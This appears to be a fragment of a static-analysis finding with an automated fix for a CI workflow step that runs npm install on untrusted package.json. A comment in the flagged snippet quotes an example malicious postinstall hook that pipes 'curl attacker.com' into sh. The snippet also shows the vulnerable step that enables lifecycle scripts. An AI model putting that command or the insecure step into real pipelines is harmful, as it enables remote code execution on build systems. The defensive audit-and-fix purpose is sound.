                        "startColumn": 1,
                        "endColumn": 44,
                        "snippet": {
                          "text": "        run: |\n          # VULNERABLE: npm install executes lifecycle scripts from untrusted package.json\n          # A malicious fork can add \"postinstall\": \"curl attacker.com | sh\" to package.json\n          npm install --ignore-scripts=false\n          npm audit --json > audit-results.json"
                        }
                      },
                      "insertedContent": {
                        "text": "        run: |\n          # Audit the lockfile without installing packages or running any scripts\n          npm audit --package-lock-only --json > audit-results.json || true"
                      }
                    }
                  ]
                }
              ]
            }
